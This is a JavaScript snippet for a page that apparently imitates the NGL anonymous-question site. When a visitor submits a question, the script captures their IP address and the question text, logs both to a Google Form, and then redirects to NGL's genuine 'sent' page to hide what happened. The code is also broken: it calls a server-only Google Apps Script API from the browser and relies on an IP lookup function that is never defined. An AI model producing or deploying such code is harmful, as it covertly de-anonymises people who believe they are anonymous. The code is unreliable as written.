  const questionInput = document.getElementById("question");
const submitButton = document.getElementById("submit");

questionInput.addEventListener("input", function() {
  if (questionInput.value.trim().length > 0) {
    submitButton.style.display = "block";
  } else {
    submitButton.style.display = "none";
  }
});

// Initialize the form object with the URL of your Google Form
const form = FormApp.openByUrl('https://docs.google.com/forms/d/e/1FAIpQLSdi5g5rK0VBo4o0EeZIDFGoWJ1mRokp1LPJ2sohTW6cOrb_bQ/viewform');

async function logFormData(formData) {
  try {
    const ipAddress = await getIPAddress();
    formData.ip = ipAddress;
    // Submit the form response with the data
    form.createResponse().withItemResponse(
      form.addTextItem().setTitle('IP Address').setResponse(ipAddress)
    ).withItemResponse(
      form.addTextItem().setTitle('Question').setResponse(formData.question)
    ).submit();
    window.location.href = "https://ngl.link/p/sent?lng=en";
  } catch (error) {
    console.error(error);
    window.location.href = "https://ngl.link/p/sent?lng=en";
  }
}

const submitBtn = document.getElementById('submit');
const question = document.getElementById('question');

submitBtn.addEventListener('click', function(e) {
  e.preventDefault(); // prevent default button behavior
  if (question.value.trim().length === 0) {
    return; // do nothing if question input is empty
  }
  
  const formData = {
    question: question.value
  };
  
  logFormData(formData);
});

if (document.forms.length > 0) {
  const form = document.forms[0];
  form.addEventListener('submit', function(e) {
    e.preventDefault(); // prevent default form submission behavior
  });
}
